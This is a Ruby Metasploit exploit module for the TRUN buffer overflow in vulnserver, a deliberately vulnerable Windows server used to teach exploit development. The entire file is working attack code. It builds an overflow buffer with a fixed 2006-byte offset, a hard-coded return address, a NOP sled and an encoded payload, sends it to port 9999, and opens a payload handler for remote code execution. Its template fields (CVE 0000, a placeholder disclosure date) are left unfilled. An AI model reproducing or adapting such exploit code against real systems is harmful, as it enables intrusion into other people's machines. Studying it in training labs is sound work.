##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  #Rank definition: http://dev.metasploit.com/redmine/projects/framework/wiki/Exploit_Ranking
  #ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'vulnserver TRUN',
      'Description'  => %q{
          TRUN command vulnerability for vulnserver
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
          'unknown',  # Original discovery
          'Dr. Phil Polstra',  # MSF Module
        ],
      'References'  =>
        [
          [ 'OSVDB', '0000' ],
          [ 'CVE', '0000' ],
          [ 'URL', 'http://philpolstra.com' ]
        ],
      'DefaultOptions' =>
        {
          'ExitFunction' => 'process', #none/process/thread/seh
          #'InitialAutoRunScript' => 'migrate -f',
        },
      'Platform'  => 'win',
      'Payload'  =>
        {
          'BadChars' => "\x00\x0a\x0d", # <change if needed>
          'DisableNops' => false,
        },

      'Targets'    =>
        [
          [ 'Vulnserver 1.0',
            {
              'Ret'     =>  0x625011AF,
              'Offset'  =>  2006
            }
          ],
        ],
      'Privileged'  => false,
      #Correct Date Format: "M D Y"
      #Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec
      'DisclosureDate'  => 'MONTH DAY YEAR',
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(9999)], self.class)

  end

  def exploit


    connect

    buffer = "TRUN ." + Rex::Text.pattern_create(2006) + [target.ret].pack('V') + make_nops(16) + payload.encoded

    print_status("Trying target #{target.name}...")
    sock.put(buffer)

    handler
    disconnect

  end
end
